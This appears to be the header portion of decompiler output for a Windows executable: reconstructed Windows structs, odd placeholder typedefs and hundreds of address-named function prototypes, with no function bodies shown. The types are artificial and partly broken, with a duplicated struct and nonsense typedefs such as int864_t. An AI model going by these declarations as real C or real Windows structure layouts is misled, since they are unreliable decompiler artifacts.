#include <math.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int80_t;
typedef int64_t int128_t;
typedef int64_t int864_t;



typedef float float16_t;
typedef float float32_t;
typedef double float64_t;
typedef long double float80_t;



struct struct1 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct struct2 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct struct3 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _NETRESOURCEW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int16_t * e4;
    int16_t * e5;
    int16_t * e6;
    int16_t * e7;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOW {
    int32_t e0;
    int16_t * e1;
    int16_t * e2;
    int16_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _cpinfo {
    int32_t e0;
    char e1[1];
    char e2[1];
};

struct tagPROCESSENTRY32W {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int16_t e9[1];
};



int32_t entry_point(void);
int32_t function_401000(void);
int32_t function_401010(void);
int32_t function_4011c0(void);
int32_t function_401410(int32_t a1, int32_t a2);
int32_t function_401960(void);
int32_t function_401990(int32_t a1);
int32_t function_4019b0(int32_t a1, int32_t a2);
int32_t function_4019d0(int32_t a1);
int32_t function_4019f0(uint32_t a1, int32_t a2, uint32_t a3);
int32_t function_401a90(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_401b30(int32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_401bf0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401d10(int32_t a1, int32_t a2);
int32_t function_401d90(int32_t a1, int32_t a2);
int32_t function_401e00(void);
int32_t function_401f70(int32_t a1, int32_t a2);
int32_t function_402050(int32_t a1);
int32_t function_402150(uint32_t a1, int32_t a2);
int32_t function_4022c0(int32_t a1);
int32_t function_402350(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4025a0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5);
int32_t function_402830(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4028e0(void);
int32_t function_402930(void);
int32_t function_4029c0(int32_t a1);
int32_t function_402af0(int32_t a1);
int32_t function_402c60(int32_t a1);
int32_t function_402ca0(int32_t a1);
int32_t function_402ce0(int32_t a1);
int32_t function_402dd0(uint32_t a1);
int32_t function_402ef0(int32_t * a1, int32_t * a2);
int32_t function_403150(uint32_t a1);
int32_t function_403210(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403bc0(int32_t a1);
int32_t function_403d10(int32_t a1, int32_t a2);
int32_t function_404030(void);
int32_t function_4040a0(void);
int32_t function_4041b0(int32_t a1);
int32_t function_404290(int32_t a1);
int32_t function_404340(void);
int32_t function_4045d0(int32_t a1);
int32_t function_4047c0(int32_t lpString2);
int32_t function_404990(int32_t lpNetResource);
int32_t function_404a60(void);
int32_t function_404a90(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_404da0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_404fd0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405030(int32_t * a1, int32_t a2);
int32_t function_405240(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4053f0(void);
int32_t function_405400(void);
int32_t function_405690(void);
int32_t function_4059c0(uint32_t a1);
int32_t function_405b20(void);
int32_t function_405b2b(int32_t a1);
int32_t function_405b5b(int32_t a1);
int32_t function_405b69(void);
int32_t function_405b90(uint32_t a1);
int32_t function_405bad(void);
int32_t function_405cb8(int32_t * a1);
int32_t function_405d02(int32_t * a1);
int32_t function_405d54(void);
int32_t function_405d96(int32_t dwMilliseconds);
int32_t function_405df6(int32_t a1, uint32_t a2);
int32_t function_405e3a(void);
int32_t function_405e6c(int32_t a1);
int32_t function_405ea5(int32_t a1);
int32_t function_405f4f(void);
int32_t function_405fd9(int32_t a1);
int32_t function_405ff6(int32_t a1, int32_t a2);
int32_t function_40601e(int32_t a1, int32_t a2);
int32_t function_406059(int32_t a1);
int32_t function_40606e(void);
int32_t function_40611a(void);
int32_t function_40612c(void);
int32_t function_4062a8(int32_t a1);
int32_t function_4062c3(int32_t a1);
int32_t function_4062db(int32_t a1);
int32_t function_4062f6(int32_t a1);
int32_t function_40630e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40633a(void);
int32_t function_40634b(char a1);
int32_t function_406378(void);
int32_t function_406395(void);
int32_t function_4063bf(int32_t a1, int32_t a2);
int32_t function_4063c4(int32_t a1, int32_t a2);
int32_t function_4064e0(void);
int32_t function_406513(void);
int32_t function_406516(void);
int32_t (*function_406559(int32_t (*lpTopLevelExceptionFilter)(struct _EXCEPTION_POINTERS *)))(struct _EXCEPTION_POINTERS *);
int32_t function_406565(int32_t a1);
int32_t function_4065a6(int32_t a1);
int32_t function_4065ae(void);
int32_t function_4065bf(void);
int32_t function_4065c0(int32_t a1);
int32_t function_406759(void);
int32_t function_40675d(int32_t a1);
int32_t function_406770(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_4067b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4067cb(int32_t a1, int32_t a2);
int32_t function_40681a(void);
int32_t function_406865(void);
void function_40686b(int32_t * ListHead);
int32_t function_406877(void);
int32_t function_40687a(void);
int32_t function_4068a1(void);
int32_t function_4068be(void);
int32_t function_4068ca(void);
int32_t function_4068d0(void);
int32_t function_4068d6(void);
int32_t function_406902(void);
int32_t function_40692e(char a1);
int32_t function_406951(int32_t ExceptionInfo);
int32_t function_406979(int32_t a1);
int32_t function_406a74(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_406aab(int32_t a1);
int32_t function_406ac6(int32_t a1);
int32_t function_406ae7(int32_t a1);
int32_t function_406b02(char * a1);
int32_t function_406b82(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_406c5f(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_406cd7(int32_t result, int32_t a2);
int32_t function_406d02(int32_t a1);
int32_t function_406d09(int32_t TargetFrame, int32_t ExceptionRecord);
int32_t function_406d5e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406d8f(int32_t result, int32_t a2);
int32_t function_406db3(int32_t a1);
int32_t function_406df8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406e8f(void);
int32_t function_406e92(int32_t a1);
int32_t function_406e97(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_406ecd(void);
int32_t function_406ef6(int32_t a1);
int32_t function_406f20(int32_t a1, int32_t a2);
int32_t function_406f60(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4070b7(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40711a(int32_t a1);
int32_t function_407139(int32_t * dwExceptionCode, int32_t * a2);
int32_t function_4071b0(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_40730a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407346(int32_t a1);
int32_t function_407362(void);
int32_t function_407370(void);
int32_t function_407402(void);
int32_t function_407446(int32_t a1);
int32_t function_407470(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4074bc(int32_t a1);
int32_t function_4074d7(void);
int32_t function_4074ef(int32_t a1);
int32_t function_40750e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_407598(void);
int32_t function_4075a2(void);
int32_t function_407628(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407649(void);
int32_t function_4076ca(void);
int32_t function_407704(char a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t function_40777d(int32_t a1);
int32_t function_4077c7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, int32_t a8);
int32_t function_407b48(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t result3, int32_t a7, int32_t a8);
int32_t function_407c63(int32_t a1, int32_t a2);
int32_t function_407cff(int32_t a1, int32_t a2);
int32_t function_407d0f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407d22(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_407da4(void);
int32_t function_407db1(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407ee5(void);
int32_t function_407f98(void);
int32_t function_407fb2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_4080af(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40813d(int32_t a1);
int32_t function_40816d(int32_t a1, int32_t a2);
int32_t function_40819a(void);
int32_t function_4081d6(void);
int32_t function_408205(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4082cb(int32_t a1, char * lpProcName, int32_t * a3, char * a4, int32_t a5, int32_t a6);
int32_t function_40833a(int32_t a1);
int32_t function_408375(int32_t dwTlsIndex);
int32_t function_4083b0(int32_t dwTlsIndex);
int32_t function_4083eb(int32_t dwTlsIndex, int32_t lpTlsValue);
int32_t function_408429(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3);
int32_t function_408470(void);
int32_t function_408499(int32_t a1);
int32_t function_4084cb(void);
int32_t function_4084e0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_408570(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4085b8(int32_t a1);
int32_t function_4085e0(int32_t a1);
int32_t function_4085f8(void);
int32_t function_408614(void);
int32_t function_408630(int32_t a1, int32_t * a2);
int32_t function_408650(int32_t TargetFrame);
int32_t function_408671(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4086b6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40873a(void);
int32_t function_408760(int32_t a1, int32_t * a2);
int32_t function_40876c(int32_t a1);
int32_t function_408777(int32_t a1, int32_t a2);
int32_t function_40878b(void);
int32_t function_40878e(void);
int32_t function_4087ab(void);
int32_t function_408841(int32_t a1, int32_t a2);
int32_t function_40884e(int32_t a1);
int32_t function_408874(int32_t a1, int32_t a2);
int32_t function_408899(int32_t a1);
int32_t function_4088e0(int32_t result, int16_t * a2, int32_t a3);
int32_t function_408e60(int32_t result, int32_t a2, int32_t a3);
int32_t function_4093d4(int32_t a1, int32_t a2);
int32_t function_409457(void);
int32_t function_409478(int32_t a1);
int32_t function_4094a9(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4095e4(int32_t a1, int32_t a2);
int32_t function_4095e6(int32_t a1);
int32_t function_4095f8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_409683(void);
int32_t function_4096a0(void);
int32_t function_4096d3(void);
int32_t function_4096de(int32_t a1);
int32_t function_4096e0(int32_t a1);
int32_t function_4096f2(int32_t a1);
int32_t function_409736(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40977f(void);
int32_t function_409788(int32_t a1, int32_t a2);
int32_t function_4098fb(uint32_t a1);
int32_t function_40991a(int32_t a1);
int32_t function_40992d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_409a1c(void);
int32_t function_409a37(void);
int32_t function_409a40(void);
int32_t function_409a46(int32_t a1);
int32_t function_409a87(void);
int32_t function_409acb(int32_t a1);
int32_t function_409b35(int32_t a1);
int32_t function_409b37(int32_t result);
int32_t function_409b44(void);
int32_t function_409b4f(void);
int32_t function_409b53(void);
int32_t function_409b5e(void);
int32_t function_409b62(int32_t a1);
int32_t function_409b73(int32_t a1);
int32_t function_409b78(int32_t a1);
int32_t function_409bb0(int32_t a1);
int32_t function_409bc1(int32_t a1);
int32_t function_409bc6(int32_t a1);
int32_t function_409cea(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_409e5f(uint32_t a1, uint32_t a2, uint32_t a3);
int32_t function_409eb4(int32_t a1);
int32_t function_409ebf(void);
int32_t function_409f18(int32_t a1);
int32_t function_409fe9(int32_t a1);
int32_t function_40a018(int32_t a1);
int32_t function_40a01a(int32_t a1);
int32_t function_40a05a(int32_t a1);
int32_t function_40a075(int32_t a1);
int32_t function_40a08e(void);
int32_t function_40a0c5(void);
int32_t function_40a0ca(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40a10f(void);
int32_t function_40a11b(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40a160(void);
int32_t function_40a16c(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4);
int32_t function_40a194(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5);
int32_t function_40a1bc(void);
int32_t function_40a2dc(void);
int32_t function_40a41d(int32_t a1, int32_t a2);
int32_t function_40a433(void);
int32_t function_40a450(int32_t * a1);
int32_t function_40a48d(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_40a4b1(void);
int32_t function_40a4c3(void);
int32_t function_40a4dd(void);
int32_t function_40a4e5(void);
int32_t function_40a522(void);
int32_t function_40a52b(void);
int32_t function_40a5a2(void);
int32_t function_40a5b4(int32_t a1, int32_t a2);
int32_t function_40a5c6(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40a5cc(int32_t result, int32_t a2);
int32_t function_40a5db(void);
int32_t function_40a5f4(int32_t a1);
int32_t function_40a608(void);
int32_t function_40a60a(int32_t a1);
int32_t function_40a651(int32_t a1);
int32_t function_40a666(void);
int32_t function_40a6b9(int32_t * a1, int32_t * a2);
int32_t function_40a715(int32_t * a1, int32_t * a2);
int32_t function_40a75a(int32_t a1);
int32_t function_40a797(void);
int32_t function_40a7a2(void);
int32_t function_40a7eb(void);
int32_t function_40a7f4(int32_t a1);
int32_t function_40a856(void);
int32_t function_40a85c(uint32_t a1);
int32_t function_40a88b(void);
int32_t function_40a891(void);
int32_t function_40a896(void);
int32_t function_40a8d4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a931(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a98b(void);
int32_t function_40a9d0(void);
int32_t function_40a9d9(int32_t a1, int32_t a2, int32_t result);
int32_t function_40aa20(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40aa98(int32_t a1);
int32_t function_40aadb(void);
int32_t function_40aadd(int32_t a1);
int32_t function_40aafe(void);
int32_t function_40ab11(void);
int32_t function_40ab24(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40ab26(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_40acd7(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_40acd9(int32_t result, uint32_t a2, int32_t a3);
int32_t function_40ad44(int32_t a1);
int32_t function_40ad46(int32_t a1);
int32_t function_40adba(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40adbc(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40ae99(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40ae9b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40af87(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40af89(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_40b0b4(int32_t a1);
int32_t function_40b176(void);
int32_t function_40b19f(int32_t a1, int32_t lpBuffer, int32_t nNumberOfBytesToWrite);
int32_t function_40b3ab(int32_t a1);
int32_t function_40b3ad(int32_t a1);
int32_t function_40b3d1(void);
int32_t function_40b49b(void);
int32_t function_40b4e5(int32_t a1);
int32_t function_40b4f9(int32_t a1);
int32_t function_40b50d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40b573(int32_t a1);
int32_t function_40b5ba(int32_t a1);
int32_t function_40b5c3(int32_t a1);
int32_t function_40b668(void);
int32_t function_40b692(void);
int32_t function_40b69b(int32_t a1, int32_t a2);
int32_t function_40b6c1(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40b705(void);
int32_t function_40b711(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40b766(void);
int32_t function_40b772(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40b7b1(void);
int32_t function_40b7bd(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40b7f9(void);
int32_t function_40b805(int32_t a1, int32_t * a2);
int32_t function_40b807(int32_t a1, int32_t a2);
int32_t function_40b82d(int32_t a1, int32_t * a2);
int32_t function_40b855(int32_t a1, int32_t * a2);
int32_t function_40b857(int32_t a1, int32_t a2);
int32_t function_40b87d(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40b8a5(int32_t a1);
int32_t function_40b920(int32_t a1);
int32_t function_40b93f(int32_t a1, int32_t a2);
int32_t function_40b9e8(int32_t a1, int32_t a2);
int32_t function_40ba33(void);
int32_t function_40bab7(void);
int32_t function_40bb3c(void);
int32_t function_40bb68(int32_t a1);
int32_t function_40bb82(int32_t a1, int32_t a2);
int32_t function_40bbaf(int32_t a1, int32_t a2);
int32_t function_40bbdc(int32_t lpMem);
int32_t function_40bc16(uint32_t a1);
int32_t function_40bc64(int32_t lpWideCharStr, int32_t a2, uint32_t a3, int32_t a4, int32_t a5);
int32_t function_40bd5e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40bd78(void);
int32_t function_40bd7a(void);
int32_t function_40be2e(void);
int32_t function_40be30(void);
int32_t function_40bee4(void);
int32_t function_40bf31(void);
int32_t function_40bf3c(void);
int32_t function_40bf68(void);
int32_t function_40bfa7(int32_t a1);
int32_t function_40bfbe(void);
int32_t function_40bfef(int32_t a1);
int32_t function_40c006(int32_t a1, char * a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_40c0a2(int32_t a1);
int32_t function_40c11d(int32_t a1);
int32_t function_40c173(int32_t dwTlsIndex);
int32_t function_40c1c9(int32_t dwTlsIndex);
int32_t function_40c21f(int32_t dwTlsIndex, int32_t lpTlsValue);
int32_t function_40c278(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3);
int32_t function_40c2da(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40c362(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_40c3be(void);
int32_t function_40c3e4(int32_t a1);
int32_t function_40c46d(char a1);
int32_t function_40c4a1(uint32_t a1, uint32_t a2);
int32_t function_40c500(uint32_t a1, uint32_t a2);
int32_t function_40c516(int32_t a1, int32_t a2);
int32_t function_40c6a6(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40c73c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40c8c0(void);
int32_t function_40c8e5(int32_t a1);
int32_t function_40c91a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40c9a1(int32_t a1, int32_t * a2);
int32_t function_40c9ac(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40c9e3(void);
int32_t function_40c9ef(int32_t a1, int32_t * a2);
int32_t function_40ca17(void);
int32_t function_40cadb(int32_t a1);
int32_t function_40cb19(int32_t a1);
int32_t function_40cb8c(int32_t a1);
int32_t function_40cbf1(int32_t a1);
int32_t function_40cd85(int32_t a1, int32_t a2);
int32_t function_40ce86(void);
int32_t function_40cea4(int32_t a1);
int32_t function_40cf35(void);
int32_t function_40cf46(int32_t a1, int32_t a2);
int32_t function_40d137(int32_t * a1, uint32_t a2, int32_t a3, uint32_t a4);
int32_t function_40d1b8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40d211(int32_t a1);
int32_t function_40d229(void);
int32_t function_40d242(int32_t a1);
int32_t function_40d279(void);
int32_t function_40d2fc(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40d374(void);
int32_t function_40d385(void);
int32_t function_40d38f(int32_t * a1, int32_t * a2);
int32_t function_40d412(int32_t * a1, int32_t * a2);
int32_t function_40d45f(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40d4ad(void);
int32_t function_40d4b9(int32_t a1, int32_t * a2, int32_t a3, int32_t a4);
int32_t function_40d4e1(int32_t a1);
int32_t function_40d523(int32_t a1, int32_t a2);
int32_t function_40d54b(void);
int32_t function_40d562(int32_t a1);
int32_t function_40d59d(void);
int32_t function_40d5a6(int32_t a1);
int32_t function_40d766(void);
int32_t function_40d775(void);
int32_t function_40d782(int32_t a1);
int32_t function_40d7a6(void);
int32_t function_40d7ae(void);
int32_t function_40d828(int32_t a1);
int32_t function_40d85d(int32_t a1);
int32_t function_40d8ec(void);
int32_t function_40d8f5(int32_t a1);
int32_t function_40d918(int32_t a1);
int32_t function_40d93b(uint32_t a1);
int32_t function_40d9cc(uint32_t a1);
int32_t function_40da36(int32_t a1);
int32_t function_40db34(int32_t a1);
int32_t function_40db9d(uint32_t a1, int32_t a2);
int32_t function_40dbd9(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40dcbd(int32_t a1, int32_t dwInfoType, char * lpMultiByteStr, int32_t cbMultiByte, int32_t * lpCharType, int32_t a6, int32_t a7);
int32_t function_40ddda(int32_t a1);
int32_t function_40ddfa(int32_t a1);
int32_t function_40de77(int32_t a1);
int32_t function_40dfc1(int32_t a1);
int32_t function_40dfea(int32_t a1);
int32_t function_40e01a(int32_t a1);
int32_t function_40e043(int32_t a1);
int32_t function_40e0c4(int32_t a1, int32_t a2);
int32_t function_40e12a(void);
int32_t function_40e13b(int32_t * a1, int32_t result);
int32_t function_40e18b(uint32_t a1);
int32_t function_40e236(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40e538(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40e5d1(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40e627(int32_t a1, int32_t a2, int32_t lpNewFilePointer, int32_t a4, int32_t a5);
int32_t function_40e6a5(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40e6c0(int32_t a1);
int32_t function_40e705(void);
int32_t function_40e79c(void);
int32_t function_40e7a5(int32_t a1);
int32_t function_40e7e3(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40e86f(void);
int32_t function_40e87b(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40e8a3(uint32_t a1);
int32_t function_40e912(int32_t a1, int32_t * a2);
int32_t function_40e94b(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40eb68(int32_t a1, int32_t a2, int32_t a3, char * a4, int32_t a5, int32_t * a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40ebb3(int32_t a1, int32_t a2);
int32_t function_40ec6f(int32_t a1);
int32_t function_40eca0(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_40ed40(int32_t a1, int32_t result, int32_t a3);
int32_t function_40ed80(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_40f11a(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40f1cb(int32_t a1);
int32_t function_40f1e0(int16_t a1, int32_t a2);
int32_t function_40f220(int32_t a1, int32_t a2);
int32_t function_40f237(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_40f2c4(void);
int32_t function_40f2d3(int32_t lpMem, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40f306(int32_t a1, uint32_t a2);
int32_t function_40f36f(int32_t a1);
int32_t function_40f3e5(void);
int32_t function_40f3e7(void);
int32_t function_40f3f8(void);
int32_t function_40f3fa(int32_t a1, int32_t a2);
int32_t function_40f424(void);
int32_t function_40f426(int32_t a1);
int32_t function_40f47f(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40f481(void);
int32_t function_40f491(int32_t a1, int32_t a2);
int32_t function_40f4b0(void);
int32_t function_40f4c7(int32_t a1);
int32_t function_40f53d(void);
int32_t function_40f5b3(void);
int32_t function_40f5bd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_40f5e0(int32_t a1, int32_t a2, int32_t a3);
float80_t function_40f730(int64_t a1);
int32_t function_40f84d(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40f8c3(void);
int32_t function_40f8cf(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40f8f7(uint32_t a1);
int32_t function_40f976(int32_t a1);
int32_t function_40fa12(int32_t a1);
int32_t function_40fa4d(void);
int32_t function_40fa60(void);
float80_t function_40fa78(int32_t a1);
int32_t function_40fceb(void);
float80_t function_40fd58(void);
float80_t function_40fd6a(void);
float80_t function_40fd84(void);
int32_t function_40fd94(void);
int32_t function_40fdf0(int32_t a1);
float80_t function_40fe1f(void);
float80_t function_40fe31(void);
float80_t function_40fe3e(void);
int32_t function_40fe81(void);
int32_t function_40feb5(void);
int32_t function_40fef0(void);
int32_t function_40ff57(void);
float80_t function_40ffe8(void);
int32_t function_40ffed(void);
float80_t function_40fff6(void);
int32_t function_40fffb(void);
float80_t function_410008(void);
float80_t function_41000f(void);
float80_t function_41003a(void);
float80_t function_410064(void);
int32_t function_4100a3(void);
int32_t function_4100c0(void);
int32_t function_4100dd(void);
float80_t function_4100f0(void);
int32_t function_410105(int32_t a1);
int32_t function_41011c(void);
int32_t function_410135(void);
int32_t function_410178(float80_t a1);
int32_t function_41018e(int32_t a1);
int32_t function_41019b(int32_t a1);
int32_t function_4101c5(void);
int32_t function_4101d9(void);
int32_t function_4101ed(float80_t a1);
int32_t function_410280(int32_t a1, int32_t result);
